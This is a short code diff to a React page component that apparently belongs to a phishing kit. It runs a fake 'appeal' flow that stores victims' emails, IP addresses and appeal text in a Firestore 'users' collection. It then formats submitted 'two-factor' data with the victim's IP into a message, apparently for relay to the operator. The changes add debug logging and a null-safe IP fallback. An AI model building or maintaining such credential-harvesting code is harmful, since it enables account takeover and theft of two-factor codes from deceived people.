@@ -60,6 +60,8 @@ export default function Home(ip) {
   } 
 
   const getData = async (data) => {
+
+    console.log(data);
     if(data.type == 'home-page') {
       setOpen({step_two: true});
       sendOpenedScript();
@@ -78,8 +80,9 @@ export default function Home(ip) {
             appeal: data.data.appeal,
             createdAt: await Timestamp.now(),
             currentStep: '',
-            ip: ip.userIP
+            ip: ip?.userIP || null
       }
+      console.log(data.data.email);
       await setDoc(doc(db, "users", data.data.email), obj);
       localStorage.setItem("email", data.data.email);
       listenUser(data.data.email);
@@ -172,6 +175,8 @@ export default function Home(ip) {
     }
     if(data.type == 'two-factor') {
       // setOpen({step_five: true})
+
+      console.log(data.data);
       const formattedMessage = `
           <b>User (${ip.userIP})</b>
           -------------------------
